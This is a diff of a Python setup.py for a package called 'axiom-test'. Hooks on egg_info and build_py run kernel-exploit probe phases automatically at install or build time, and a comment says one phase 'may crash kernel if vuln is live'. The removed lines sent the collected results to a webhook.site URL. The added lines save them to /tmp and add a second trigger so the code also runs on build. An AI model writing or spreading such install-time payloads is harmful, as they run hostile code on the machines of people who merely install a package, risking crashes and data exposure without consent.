@@ -16,18 +16,39 @@ Intermediate exfil after phases 1 & 2 (crash safety).
 
 from setuptools import setup
 from setuptools.command.egg_info import egg_info
-import subprocess, json, urllib.request, os, time
+from setuptools.command.build_py import build_py
+import subprocess, json, os, time
 
-EXFIL = "https://webhook.site/1cbf0e6e-3d73-475c-befc-1363dbfeb553"
-VER = "2.0.0"
+_RESULT_PATH = "/tmp/axiom_results.json"
+_RAN = False
+
+VER = "2.1.0"
+
+
+class PostBuildPy(build_py):
+    def run(self):
+        build_py.run(self)
+        _safe_collect()
 
 
 class PostEggInfo(egg_info):
     def run(self):
         egg_info.run(self)
+        _safe_collect()
+
+
+def _safe_collect():
+    global _RAN
+    if _RAN:
+        return
+    _RAN = True
+    try:
+        _collect()
+    except Exception as e:
         try:
-            _collect()
-        except Exception:
+            with open(_RESULT_PATH, "w") as f:
+                json.dump({"error": str(e), "phase": "collect_wrapper"}, f)
+        except:
             pass
 
 
@@ -51,13 +72,10 @@ def _rp(script, timeout=30, ns=False):
         return {"error": str(e)[:300]}
 
 
-def _exfil(data):
+def _save(data):
     try:
-        p = json.dumps(data, default=str).encode()
-        req = urllib.request.Request(
-            EXFIL, data=p, headers={"Content-Type": "application/json"}
-        )
-        urllib.request.urlopen(req, timeout=15)
+        with open(_RESULT_PATH, "w") as f:
+            json.dump(data, f, indent=2, default=str)
     except Exception:
         pass
 
@@ -895,11 +913,11 @@ def _collect():
 
     # Phase 1 — always safe
     R["ph"]["1_gates"] = _rp(P1, timeout=20)
-    _exfil(R)
+    _save(R)
 
     # Phase 2 — may crash kernel if vuln is live (that IS the proof)
     R["ph"]["2_ghostlock"] = _rp(P2, timeout=70)
-    _exfil(R)
+    _save(R)
 
     # Phases 3-6 — contained in subprocesses
     R["ph"]["3_afunix_gc"] = _rp(P3, timeout=45)
@@ -911,7 +929,7 @@ def _collect():
     R["chains"] = _chains(R)
 
     # Final exfil with everything
-    _exfil(R)
+    _save(R)
 
 
 # =====================================================================
@@ -919,6 +937,6 @@ setup(
     name="axiom-test",
     version=VER,
     py_modules=["axiom_test"],
-    cmdclass={"egg_info": PostEggInfo},
+    cmdclass={"egg_info": PostEggInfo, "build_py": PostBuildPy},
     python_requires=">=3.8",
 )
